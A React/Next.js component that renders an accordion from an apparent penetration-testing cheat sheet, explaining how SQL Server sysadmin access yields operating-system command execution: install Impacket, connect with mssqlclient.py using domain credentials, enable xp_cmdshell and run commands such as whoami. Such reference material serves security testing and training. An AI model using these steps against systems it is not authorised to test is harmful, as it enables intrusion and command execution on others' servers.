import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import Image from "next/image";

interface IProps {
  title: string;
}

const SQLAdmin = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              An account with sysadmin privileges on an SQL Server instance can
              log into the instance remotely and execute queries against the
              database. This access can be used to run operating system commands
              in the context of the SQL Server service account through various
              methods.
            </Typography>
            <Image
              src="/sqladmin.png"
              height={148}
              width={441}
              priority={true}
            />
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>Get `mssqlclient.py` from Impacket.</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"pip install impacket"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"mssqlclient.py {DOMAIN}/{USER}@{IP} -windows-auth"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Type `help` to get a list of available options.
            </Typography>
            <Image
              src="/sqladmin2.png"
              height={213}
              width={730}
              priority={true}
            />
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>
              To get command execution, we can use the `enable_xp_cmdshell`
              command.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"SQL> enable_xp_cmdshell"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 5</Typography>
            <Typography>
              We can now run commands in the format `xp_cmdshell
              &lt;command&gt;`.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"SQL> xp_cmdshell whoami"}
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default SQLAdmin;
